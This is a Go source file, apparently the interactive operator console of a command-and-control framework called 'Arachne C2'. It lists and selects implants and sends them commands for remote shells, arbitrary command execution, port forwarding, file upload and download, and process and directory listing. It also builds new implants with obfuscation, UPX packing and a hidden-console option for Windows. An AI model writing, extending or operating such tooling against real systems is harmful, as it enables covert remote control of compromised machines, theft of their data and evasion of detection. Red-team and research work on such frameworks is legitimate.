package core

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/peterh/liner"
)

var commandHelp = map[string]string{
	"list":     "list — show registered implants",
	"select":   "select <idx> — select implant by index",
	"ps":       "ps — list processes on selected implant",
	"ls":       "ls [path] — list directory (default: .)",
	"cd":       "cd [path] — change directory (default: .)",
	"pwd":      "pwd — print working directory",
	"shell":    "shell — interactive shell on selected implant (direct libp2p stream)",
	"portfwd":  "portfwd <local-port> <target-host:target-port> — forward local port through implant",
	"exec":     "exec <command> [args...] — execute command on selected implant",
	"download": "download <remote-path> — download file from implant",
	"upload":   "upload <local-path> <remote-path> — upload file to implant",
	"generate":   "generate [flags] — build an implant (all flags optional)\n  --os <string>      target OS: linux, darwin, windows (default: linux)\n  --arch <string>    target arch: amd64, arm64 (default: amd64)\n  --output <path>    output path (default: ./implant)\n  --pubkey <path>    operator public key (default: ~/.arachne/operator.pub)\n  --upx              enable UPX compression (default: true)\n  --obfuscate        obfuscate the binary with garble (auto-installs if missing)\n  --quiet            suppress output, detach from terminal, hide console on Windows",
	"regenerate": "regenerate — regenerate operator keypair (old implants will not call back)",
	"help":       "help [command] — show this help or help for a specific command",
	"exit":     "exit — quit the console",
}

func checkHelp(args []string) bool {
	for _, a := range args {
		if a == "--help" || a == "-h" {
			return true
		}
	}
	return false
}

func (o *Operator) RunCLI() {
	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)

	histPath := filepath.Join(arachneDir(), "history")
	if f, err := os.Open(histPath); err == nil {
		line.ReadHistory(f)
		f.Close()
	}

	var selected *ImplantRecord

	fmt.Println("Arachne C2 — interactive console")
	fmt.Println("Type 'help' for commands, 'help <command>' for details.")
	fmt.Println()

	for {
		prompt := "arachne> "
		if selected != nil {
			prompt = fmt.Sprintf("arachne[%s@%s]> ", selected.Name, selected.Hostname)
		}

		input, err := line.Prompt(prompt)
		if err != nil {
			if err == liner.ErrPromptAborted {
				continue
			}
			saveHistory(histPath, line)
			break
		}
		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		line.AppendHistory(input)

		parts := strings.Fields(input)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			if f, err := os.Create(histPath); err == nil {
				line.WriteHistory(f)
				f.Close()
			}
			return

		case "help":
			if len(args) > 0 {
				if h, ok := commandHelp[args[0]]; ok {
					fmt.Println("  " + h)
				} else {
					fmt.Printf("no help for '%s'\n", args[0])
				}
				continue
			}
			fmt.Println("Commands:")
			for _, name := range []string{"list", "select", "ps", "ls", "cd", "pwd", "shell", "portfwd", "exec", "download", "upload", "generate", "regenerate", "help", "exit"} {
				line := commandHelp[name]
				if i := strings.IndexByte(line, '\n'); i >= 0 {
					line = line[:i]
				}
				fmt.Println("  " + line)
			}
			fmt.Println("Use 'help <command>' for details and flags.")

		case "list":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["list"])
				continue
			}
			implants := o.ListImplants()
			if len(implants) == 0 {
				fmt.Println("no implants registered")
				continue
			}
			for i, rec := range implants {
				ago := time.Since(rec.LastCheckin).Round(time.Second)
				fmt.Printf("  %d: %s@%s [%s/%s] last=%s peer=%s\n",
					i, rec.Name, rec.Hostname, rec.OS, rec.Arch, ago, shortenStr(rec.PeerID, 20))
			}

		case "select":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["select"])
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: select <idx>")
				continue
			}
			idx, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("bad index: %v\n", err)
				continue
			}
			implants := o.ListImplants()
			if idx < 0 || idx >= len(implants) {
				fmt.Println("index out of range")
				continue
			}
			selected = implants[idx]
			fmt.Printf("selected %s@%s (%s)\n", selected.Name, selected.Hostname, selected.PeerID)

		case "ps":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["ps"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Ps(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "ls":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["ls"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Ls(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "cd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["cd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Cd(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "pwd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["pwd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Pwd(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "shell":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["shell"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			fmt.Printf("opening shell to %s@%s...\n", selected.Name, selected.Hostname)
			if err := o.OpenShell(selected.PeerID); err != nil {
				fmt.Printf("shell error: %v\n", err)
			}

		case "portfwd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["portfwd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) < 2 {
				fmt.Println("usage: portfwd <local-port> <target-host:target-port>")
				continue
			}
			localPort, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("bad port: %v\n", err)
				continue
			}
			if err := o.Portfwd(selected.PeerID, localPort, args[1]); err != nil {
				fmt.Printf("portfwd error: %v\n", err)
			}

		case "download":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["download"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: download <path>")
				continue
			}
			if err := o.Download(selected.PeerID, args[0]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("download command sent")
			}

		case "upload":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["upload"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) < 2 {
				fmt.Println("usage: upload <src> <dst>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("read %s: %v\n", args[0], err)
				continue
			}
			if err := o.Upload(selected.PeerID, args[1], data); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Printf("uploaded %d bytes to %s\n", len(data), args[1])
			}

		case "exec", "execute":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["exec"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: exec <cmd> [args...]")
				continue
			}
			if err := o.Execute(selected.PeerID, args[0], args[1:]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "generate":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["generate"])
				continue
			}
			if err := RunGenerate(args); err != nil {
				fmt.Printf("generate error: %v\n", err)
			}

		case "regenerate":
			fmt.Println("WARNING: regenerating operator keys will invalidate ALL existing implants.")
			fmt.Println("Old implants have your current public key embedded and will NOT be able to call back.")
			ans, err := line.Prompt("Are you sure? [y/N] ")
			if err != nil || (ans != "y" && ans != "Y" && ans != "yes") {
				fmt.Println("cancelled")
				continue
			}
			keyPath := keyPath()
			pubPath := pubKeyPath()
			os.Remove(keyPath)
			os.Remove(pubPath)
			log.Printf("deleted %s and %s", keyPath, pubPath)
			log.Printf("regenerated keys will take effect on next startup")
			fmt.Println("Restart arachne for the new keys to take effect.")

		default:
			fmt.Printf("unknown command: %s (try 'help')\n", cmd)
		}
	}
}

func saveHistory(path string, line *liner.State) {
	if f, err := os.Create(path); err == nil {
		line.WriteHistory(f)
		f.Close()
	}
}

func shortenStr(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
